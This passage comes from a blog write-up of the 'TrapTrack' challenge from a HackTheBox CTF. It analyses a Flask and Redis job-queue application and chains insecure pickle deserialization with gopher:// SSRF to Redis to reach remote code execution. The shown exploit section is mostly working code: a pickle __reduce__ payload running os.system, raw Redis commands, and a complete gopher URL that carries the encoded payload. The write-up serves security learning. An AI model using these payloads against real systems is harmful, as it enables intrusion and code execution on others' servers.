<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">job</span>

<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">incr_field</span><span class="mtk1">(</span><span class="mtk9 mtki">job</span><span class="mtk1">, </span><span class="mtk9 mtki">field</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk9 mtki">job</span><span class="mtk1">[</span><span class="mtk9 mtki">field</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">job</span><span class="mtk1">[</span><span class="mtk9 mtki">field</span><span class="mtk1">] </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span>
<span class="mtk1">    </span><span class="mtk1">store</span><span class="mtk1">.</span><span class="mtk8">hset</span><span class="mtk1">(</span><span class="mtk8">env</span><span class="mtk1">(</span><span class="mtk4">'REDIS_JOBS'</span><span class="mtk1">), </span><span class="mtk9 mtki">job</span><span class="mtk1">[</span><span class="mtk4">'job_id'</span><span class="mtk1">], </span><span class="mtk8 mtku">base64</span><span class="mtk1">.</span><span class="mtk8">b64encode</span><span class="mtk1">(</span><span class="mtk8 mtku">pickle</span><span class="mtk1">.</span><span class="mtk8">dumps</span><span class="mtk1">(</span><span class="mtk9 mtki">job</span><span class="mtk1">)))</span>  

<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">decr_field</span><span class="mtk1">(</span><span class="mtk9 mtki">job</span><span class="mtk1">, </span><span class="mtk9 mtki">field</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk9 mtki">job</span><span class="mtk1">[</span><span class="mtk9 mtki">field</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">job</span><span class="mtk1">[</span><span class="mtk9 mtki">field</span><span class="mtk1">] </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span>
<span class="mtk1">    </span><span class="mtk1">store</span><span class="mtk1">.</span><span class="mtk8">hset</span><span class="mtk1">(</span><span class="mtk8">env</span><span class="mtk1">(</span><span class="mtk4">'REDIS_JOBS'</span><span class="mtk1">), </span><span class="mtk9 mtki">job</span><span class="mtk1">[</span><span class="mtk4">'job_id'</span><span class="mtk1">], </span><span class="mtk8 mtku">base64</span><span class="mtk1">.</span><span class="mtk8">b64encode</span><span class="mtk1">(</span><span class="mtk8 mtku">pickle</span><span class="mtk1">.</span><span class="mtk8">dumps</span><span class="mtk1">(</span><span class="mtk9 mtki">job</span><span class="mtk1">)))</span>

<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">set_field</span><span class="mtk1">(</span><span class="mtk9 mtki">job</span><span class="mtk1">, </span><span class="mtk9 mtki">field</span><span class="mtk1">, </span><span class="mtk9 mtki">val</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk9 mtki">job</span><span class="mtk1">[</span><span class="mtk9 mtki">field</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">val</span>
<span class="mtk1">    </span><span class="mtk1">store</span><span class="mtk1">.</span><span class="mtk8">hset</span><span class="mtk1">(</span><span class="mtk8">env</span><span class="mtk1">(</span><span class="mtk4">'REDIS_JOBS'</span><span class="mtk1">), </span><span class="mtk9 mtki">job</span><span class="mtk1">[</span><span class="mtk4">'job_id'</span><span class="mtk1">], </span><span class="mtk8 mtku">base64</span><span class="mtk1">.</span><span class="mtk8">b64encode</span><span class="mtk1">(</span><span class="mtk8 mtku">pickle</span><span class="mtk1">.</span><span class="mtk8">dumps</span><span class="mtk1">(</span><span class="mtk9 mtki">job</span><span class="mtk1">)))</span>

<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">run_worker</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">job</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_work_item</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk1">job</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">return</span>

<span class="mtk1">    </span><span class="mtk8">incr_field</span><span class="mtk1">(</span><span class="mtk1">job</span><span class="mtk1">, </span><span class="mtk4">'inprogress'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">trapURL</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">job</span><span class="mtk1">[</span><span class="mtk4">'trap_url'</span><span class="mtk1">]</span>

<span class="mtk1">    </span><span class="mtk1">response</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">request</span><span class="mtk1">(</span><span class="mtk1">trapURL</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk8">set_field</span><span class="mtk1">(</span><span class="mtk1">job</span><span class="mtk1">, </span><span class="mtk4">'health'</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">response</span><span class="mtk1"> </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk8">incr_field</span><span class="mtk1">(</span><span class="mtk1">job</span><span class="mtk1">, </span><span class="mtk4">'completed'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk8">decr_field</span><span class="mtk1">(</span><span class="mtk1">job</span><span class="mtk1">, </span><span class="mtk4">'inprogress'</span><span class="mtk1">)</span>

<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1"> </span><span class="mtk6">True</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk8 mtku">time</span><span class="mtk1">.</span><span class="mtk8">sleep</span><span class="mtk1">(</span><span class="mtk6">10</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk8">run_worker</span><span class="mtk1">()</span>
</code></pre></div><p>The worker is always querying the Redis queue. When a new message arrives to the queue, it is processed by <code>get_work_item</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">get_work_item</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">job_id</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">store</span><span class="mtk1">.</span><span class="mtk8">rpop</span><span class="mtk1">(</span><span class="mtk8">env</span><span class="mtk1">(</span><span class="mtk4">'REDIS_QUEUE'</span><span class="mtk1">))</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk1">job_id</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">False</span>

<span class="mtk1">    </span><span class="mtk1">data</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">store</span><span class="mtk1">.</span><span class="mtk8">hget</span><span class="mtk1">(</span><span class="mtk8">env</span><span class="mtk1">(</span><span class="mtk4">'REDIS_JOBS'</span><span class="mtk1">), </span><span class="mtk1">job_id</span><span class="mtk1">)</span>  

<span class="mtk1">    </span><span class="mtk1">job</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">pickle</span><span class="mtk1">.</span><span class="mtk8">loads</span><span class="mtk1">(</span><span class="mtk8 mtku">base64</span><span class="mtk1">.</span><span class="mtk8">b64decode</span><span class="mtk1">(</span><span class="mtk1">data</span><span class="mtk1">))</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">job</span>
</code></pre></div><p>For experienced CTF players, the vulnerability here is pretty clear. There is an insecure deserialization vulnerability in <code>pickle.loads</code> (as long as we can control variable <code>data</code>, which comes from the Redis queue).</p><p>Moreover, the worker uses a function called <code>request</code> that is in the file <code>challenge/worker/healthcheck.py</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">pycurl</span>

<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">request</span><span class="mtk1">(</span><span class="mtk9 mtki">url</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk1">response</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">False</span>
<span class="mtk1">    </span><span class="mtk5">try</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk1">c</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">pycurl</span><span class="mtk1">.</span><span class="mtk8 mtku">Curl</span><span class="mtk1">()</span>
<span class="mtk1">        </span><span class="mtk1">c</span><span class="mtk1">.</span><span class="mtk8">setopt</span><span class="mtk1">(</span><span class="mtk1">c</span><span class="mtk1">.</span><span class="mtk6">URL</span><span class="mtk1">, </span><span class="mtk9 mtki">url</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk1">c</span><span class="mtk1">.</span><span class="mtk8">setopt</span><span class="mtk1">(</span><span class="mtk1">c</span><span class="mtk1">.</span><span class="mtk6">TIMEOUT</span><span class="mtk1">, </span><span class="mtk6">5</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk1">c</span><span class="mtk1">.</span><span class="mtk8">setopt</span><span class="mtk1">(</span><span class="mtk1">c</span><span class="mtk1">.</span><span class="mtk6">VERBOSE</span><span class="mtk1">, </span><span class="mtk6">True</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk1">c</span><span class="mtk1">.</span><span class="mtk8">setopt</span><span class="mtk1">(</span><span class="mtk1">c</span><span class="mtk1">.</span><span class="mtk6">FOLLOWLOCATION</span><span class="mtk1">, </span><span class="mtk6">True</span><span class="mtk1">)</span>

<span class="mtk1">        </span><span class="mtk1">response</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">c</span><span class="mtk1">.</span><span class="mtk8">perform_rb</span><span class="mtk1">().</span><span class="mtk8">decode</span><span class="mtk1">(</span><span class="mtk4">'utf-8'</span><span class="mtk1">, </span><span class="mtk9 mtki">errors</span><span class="mtk5">=</span><span class="mtk4">'ignore'</span><span class="mtk1">)</span>  
<span class="mtk1">        </span><span class="mtk1">c</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk5">finally</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">response</span>
</code></pre></div><p>The worker uses <code>curl</code> (well, <code>PyCurl</code>) to perform the requests. Again, experienced CTF players may join the dots and see that when a challenge involves Redis, probably there must be a Server-Side Request Forgery (SSRF) attack using <code>gopher://</code> protocol (like in <a href="../../../htb-challenges/web/red-island">Red Island</a> from HTB Cyber Apocalypse 2022).</p><h3 id="flask-web-application">Flask web application</h3><p>The Flask application is not so interesgin as long as we understood the functionality and the architecture of the challenge.</p><p>Perhaps some interesting methods are <code>create_job_queue</code> and <code>get_job_queue</code> from <code>challenge/application/cache.py</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">create_job_queue</span><span class="mtk1">(</span><span class="mtk9 mtki">trapName</span><span class="mtk1">, </span><span class="mtk9 mtki">trapURL</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk1">job_id</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_job_id</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">data</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk4">'job_id'</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">job_id</span><span class="mtk1">),</span>
<span class="mtk1">        </span><span class="mtk4">'trap_name'</span><span class="mtk1">: </span><span class="mtk9 mtki">trapName</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'trap_url'</span><span class="mtk1">: </span><span class="mtk9 mtki">trapURL</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'completed'</span><span class="mtk1">: </span><span class="mtk6">0</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'inprogress'</span><span class="mtk1">: </span><span class="mtk6">0</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'health'</span><span class="mtk1">: </span><span class="mtk6">0</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk1">current_app</span><span class="mtk1">.redis.hset(</span><span class="mtk8">env</span><span class="mtk1">(</span><span class="mtk4">'REDIS_JOBS'</span><span class="mtk1">), </span><span class="mtk1">job_id</span><span class="mtk1">, </span><span class="mtk8 mtku">base64</span><span class="mtk1">.</span><span class="mtk8">b64encode</span><span class="mtk1">(</span><span class="mtk8 mtku">pickle</span><span class="mtk1">.</span><span class="mtk8">dumps</span><span class="mtk1">(</span><span class="mtk1">data</span><span class="mtk1">)))</span>  

<span class="mtk1">    </span><span class="mtk1">current_app</span><span class="mtk1">.redis.rpush(</span><span class="mtk8">env</span><span class="mtk1">(</span><span class="mtk4">'REDIS_QUEUE'</span><span class="mtk1">), </span><span class="mtk1">job_id</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">data</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">get_job_queue</span><span class="mtk1">(</span><span class="mtk9 mtki">job_id</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk1">data</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">current_app</span><span class="mtk1">.redis.hget(</span><span class="mtk8">env</span><span class="mtk1">(</span><span class="mtk4">'REDIS_JOBS'</span><span class="mtk1">), </span><span class="mtk9 mtki">job_id</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">data</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">pickle</span><span class="mtk1">.</span><span class="mtk8">loads</span><span class="mtk1">(</span><span class="mtk8 mtku">base64</span><span class="mtk1">.</span><span class="mtk8">b64decode</span><span class="mtk1">(</span><span class="mtk1">data</span><span class="mtk1">))</span>

<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">None</span>
</code></pre></div><p>These method handle the website information from the user: send the object to the Redis queue serialized with <code>pickle.dumps</code> and retrieve them and deserialize it with <code>pickle.loads</code> (thus, here we have another vulnerability).</p><h2 id="getting-rce">Getting RCE</h2><p>The exploit for this challenge is not difficult but requires to chain various techniques.</p><h3 id="insecure-deserialization-in-pickle">Insecure deserialization in <code>pickle</code></h3><p>In order to get RCE from <code>pickle.loads</code>, we can create a Python class that implements method <code>__reduce__</code> as follows (more information at <a href="https://book.hacktricks.xyz/pentesting-web/deserialization#pickle">HackTricks</a>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
&gt;&gt;&gt; import base64, pickle
&gt;&gt;&gt;
&gt;&gt;&gt; class Bad:
...     def __reduce__(self):
...         return exec, ('import os; os.system("whoami")', )
...
&gt;&gt;&gt; base64.b64encode(pickle.dumps(Bad()))
b'gASVOgAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIweaW1wb3J0IG9zOyBvcy5zeXN0ZW0oIndob2FtaSIplIWUUpQu'  
</code></pre></div><p>Using that payload, we will execute <code>whoami</code> when <code>pickle.loads</code> is called on that serialized object:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; pickle.loads(base64.b64decode(b'gASVOgAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIweaW1wb3J0IG9zOyBvcy5zeXN0ZW0oIndob2FtaSIplIWUUpQu'))  
rocky
</code></pre></div><h3 id="ssrf-to-redis">SSRF to Redis</h3><p>Since we need to control the messages in the queue, we must talk to Redis to do that. For this, I started the Docker container and connected to it:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">root@6d48bc730689:/app# redis-cli
127.0.0.1:6379> KEYS *
1) "jobs"
2) "100"
127.0.0.1:6379> GET "100"
"101"
127.0.0.1:6379> HGET "jobs" "100"
"gASVeAAAAAAAAAB9lCiMBmpvYl9pZJRLZIwJdHJhcF9uYW1llIwJV2lraXBlZGlhlIwIdHJhcF91cmyUjBpodHRwczovL3d3dy53aWtpcGVkaWEub3JnL5SMCWNvbXBsZXRlZJRLAYwKaW5wcm9ncmVzc5RLAIwGaGVhbHRolEsBdS4="  
</code></pre></div><p>Using <code>HSET</code> we are able to enter a new item in the queue named <code>jobs</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">127.0.0.1:6379> HSET "jobs" "foo" "bar"  
(integer) 1
127.0.0.1:6379> HGET "jobs" "foo"
"bar"
</code></pre></div><p>However, we don&rsquo;t have access to <code>redis-cli</code>, so we need to use <code>gopher://</code> and <code>curl</code> as follows:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">root@6d48bc730689:/app# curl 'gopher://127.0.0.1:6379/_HSET%20%22jobs%22%20%22test%22%20%22ssrf%22'  
:1
^C
root@6d48bc730689:/app# curl 'gopher://127.0.0.1:6379/_HGET%20%22jobs%22%20%22test%22'
$4
ssrf
^C
</code></pre></div><p>The syntax is the same, but we need to start with an underscore (<code>_</code>) and URL-encode all characters (namely, spaces and double quotes).</p><p>At this point, we are able to enter the <code>gopher://</code> URL in the website to store a malicious <code>pickle</code> serialized object and achieve RCE when the worker deserializes the message.</p><h3 id="overkill-strategy">Overkill strategy</h3><p>With the above primitives, we can get the flag. Having RCE allows us to use <code>curl</code> to a controlled server and send back the flag (the output of <code>/readflag</code>). During the CTF, I didn&rsquo;t notice that the challenge had Internet connection and assumed that there was not. Hence, to capture the flag I tried to somehow add the content to the website or to the databases (SQLite3 or Redis).</p><p>The SQLite3 database was not useful because it was read-only (at least, when doing the challenge it appeared to be read-only. I have tested right now and it is not! This would have facilitated the exploit a lot). Hence, I tried to store the flag inside the Redis queue using <code>redis-cli</code> with the format expected by the application (a specific object serialized with <code>pickle</code>). This was the approach (in proggresive steps):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">root@6d48bc730689:/app# /readflag
HTB{f4k3_fl4g_f0r_t3st1ng}
root@6d48bc730689:/app# python3 -c "print('$(/readflag)')"
HTB{f4k3_fl4g_f0r_t3st1ng}
root@6d48bc730689:/app# python3 -c "print({'job_id': 1234, 'trap_name': '$(/readflag)', 'trap_url': 'https://7rocky.github.io', 'completed': 0, 'inprogress': 0, 'health': 0})"
{'job_id': 1234, 'trap_name': 'HTB{f4k3_fl4g_f0r_t3st1ng}', 'trap_url': 'https://7rocky.github.io', 'completed': 0, 'inprogress': 0, 'health': 0}
root@6d48bc730689:/app# python3 -c "import base64, pickle; print(base64.b64encode(pickle.dumps({'job_id': 1234, 'trap_name': '$(/readflag)', 'trap_url': 'https://7rocky.github.io', 'completed': 0, 'inprogress': 0, 'health': 0})))"
b'gASViAAAAAAAAAB9lCiMBmpvYl9pZJRN0gSMCXRyYXBfbmFtZZSMGkhUQntmNGszX2ZsNGdfZjByX3Qzc3Qxbmd9lIwIdHJhcF91cmyUjBhodHRwczovLzdyb2NreS5naXRodWIuaW+UjAljb21wbGV0ZWSUSwCMCmlucHJvZ3Jlc3OUSwCMBmhlYWx0aJRLAHUu'
root@6d48bc730689:/app# python3 -c "import base64, pickle; print(base64.b64encode(pickle.dumps({'job_id': 1234, 'trap_name': '$(/readflag)', 'trap_url': 'https://7rocky.github.io', 'completed': 0, 'inprogress': 0, 'health': 0})).decode())"  
gASViAAAAAAAAAB9lCiMBmpvYl9pZJRN0gSMCXRyYXBfbmFtZZSMGkhUQntmNGszX2ZsNGdfZjByX3Qzc3Qxbmd9lIwIdHJhcF91cmyUjBhodHRwczovLzdyb2NreS5naXRodWIuaW+UjAljb21wbGV0ZWSUSwCMCmlucHJvZ3Jlc3OUSwCMBmhlYWx0aJRLAHUu
</code></pre></div><p>That is the serialized object we want to store in the queue. Notice that the serialization must be done once obtained RCE so that <code>$(/readflag)</code> is replaced with the flag. In order to store it using <code>redis-cli</code>, we must pass it via <code>stdin</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">root@6d48bc730689:/app# echo 'KEYS *' | redis-cli
1) "jobs"
2) "100"
root@6d48bc730689:/app# echo 'HSET "jobs" "1337" "'$(python3 -c "import base64, pickle; print(base64.b64encode(pickle.dumps({'job_id': 1234, 'trap_name': '$(/readflag)', 'trap_url': 'https://7rocky.github.io', 'completed': 0, 'inprogress': 0, 'health': 0})).decode())")'"'  | redis-cli  
(integer) 0
root@6d48bc730689:/app# echo 'HGET "jobs" "1337"' | redis-cli
"gASViAAAAAAAAAB9lCiMBmpvYl9pZJRN0gSMCXRyYXBfbmFtZZSMGkhUQntmNGszX2ZsNGdfZjByX3Qzc3Qxbmd9lIwIdHJhcF91cmyUjBhodHRwczovLzdyb2NreS5naXRodWIuaW+UjAljb21wbGV0ZWSUSwCMCmlucHJvZ3Jlc3OUSwCMBmhlYWx0aJRLAHUu"
</code></pre></div><p>At this point, we can read the flag accessing to <code>/api/tracks/1337/status</code> in Burp Suite:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/TrapTrack-9.png" alt="TrapTrack 9"></p><p>Therefore, the above command is what we need to serialize in a malicious <code>pickle</code> payload, and then store the payload using <code>gopher://</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">root@6d48bc730689:/app# echo 'HDEL "jobs" "1337"' | redis-cli
(integer) 1
root@6d48bc730689:/app# python3 -q
>>> import base64, pickle
>>>
>>> cmd = """echo 'HSET "jobs" "1337" "'$(python3 -c "import base64, pickle; print(base64.b64encode(pickle.dumps({'job_id': 1234, 'trap_name': '$(/readflag)', 'trap_url': 'https://7rocky.github.io', 'completed': 0, 'inprogress': 0, 'health': 0})).decode())")'"'  | redis-cli"""
>>>
>>> class Bad:
...     def __reduce__(self):
...         return exec, (f'import os; os.system("""{cmd}""")', )
...
>>> base64.b64encode(pickle.dumps(Bad()))
b'gASVQAEAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlFghAQAAaW1wb3J0IG9zOyBvcy5zeXN0ZW0oIiIiZWNobyAnSFNFVCAiam9icyIgIjEzMzciICInJChweXRob24zIC1jICJpbXBvcnQgYmFzZTY0LCBwaWNrbGU7IHByaW50KGJhc2U2NC5iNjRlbmNvZGUocGlja2xlLmR1bXBzKHsnam9iX2lkJzogMTIzNCwgJ3RyYXBfbmFtZSc6ICckKC9yZWFkZmxhZyknLCAndHJhcF91cmwnOiAnaHR0cHM6Ly83cm9ja3kuZ2l0aHViLmlvJywgJ2NvbXBsZXRlZCc6IDAsICdpbnByb2dyZXNzJzogMCwgJ2hlYWx0aCc6IDB9KSkuZGVjb2RlKCkpIiknIicgIHwgcmVkaXMtY2xpIiIiKZSFlFKULg=='  
</code></pre></div><p>So, entering this URL will do the trick (notice that the <code>job_id</code> is 9999):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">gopher://127.0.0.1:6379/_HSET%20%22jobs%22%20%229999%22%20%22gASVQAEAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlFghAQAAaW1wb3J0IG9zOyBvcy5zeXN0ZW0oIiIiZWNobyAnSFNFVCAiam9icyIgIjEzMzciICInJChweXRob24zIC1jICJpbXBvcnQgYmFzZTY0LCBwaWNrbGU7IHByaW50KGJhc2U2NC5iNjRlbmNvZGUocGlja2xlLmR1bXBzKHsnam9iX2lkJzogMTIzNCwgJ3RyYXBfbmFtZSc6ICckKC9yZWFkZmxhZyknLCAndHJhcF91cmwnOiAnaHR0cHM6Ly83cm9ja3kuZ2l0aHViLmlvJywgJ2NvbXBsZXRlZCc6IDAsICdpbnByb2dyZXNzJzogMCwgJ2hlYWx0aCc6IDB9KSkuZGVjb2RlKCkpIiknIicgIHwgcmVkaXMtY2xpIiIiKZSFlFKULg==%22  
</code></pre></div><p>Let&rsquo;s do it locally:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/TrapTrack-10.png" alt="TrapTrack 10"></p><p>After a short time, the job is completed:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/TrapTrack-11.png" alt="TrapTrack 11"></p><p>Now we need to tell the worker to load our malicious <code>pickle</code> payload, so we request the <code>job_id</code> 9999:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/TrapTrack-12.png" alt="TrapTrack 12"></p><p>The server returns an error because the serialized payload is not a valid object accepted by the server. However, the RCE payload was executed and therefore, there should be another job with <code>job_id</code> 1337:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/TrapTrack-13.png" alt="TrapTrack 13"></p><p>There it is! Now it&rsquo;s time to go remote and follow the same steps:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/TrapTrack-14.png" alt="TrapTrack 14"></p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/TrapTrack-15.png" alt="TrapTrack 15"></p><h2 id="flag">Flag</h2><p>And here&rsquo;s the flag (<code>HTB{tr4p_qu3u3d_t0_rc3!}</code>):</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/TrapTrack-16.png" alt="TrapTrack 16"></p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#website-functionality">Website functionality</a></li><li><a href="#application-infrastructure">Application infrastructure</a></li><li><a href="#source-code-analysis">Source code analysis</a><ul><li><a href="#finding-the-objective">Finding the objective</a></li><li><a href="#worker">Worker</a></li><li><a href="#flask-web-application">Flask web application</a></li></ul></li><li><a href="#getting-rce">Getting RCE</a><ul><li><a href="#insecure-deserialization-in-pickle">Insecure deserialization in <code>pickle</code></a></li><li><a href="#ssrf-to-redis">SSRF to Redis</a></li><li><a href="#overkill-strategy">Overkill strategy</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Receive a weekly blog digest</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Enter your email address" name="email" id="tlemail">
<input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Submit"></p><input type="hidden" value="1" name="embed">
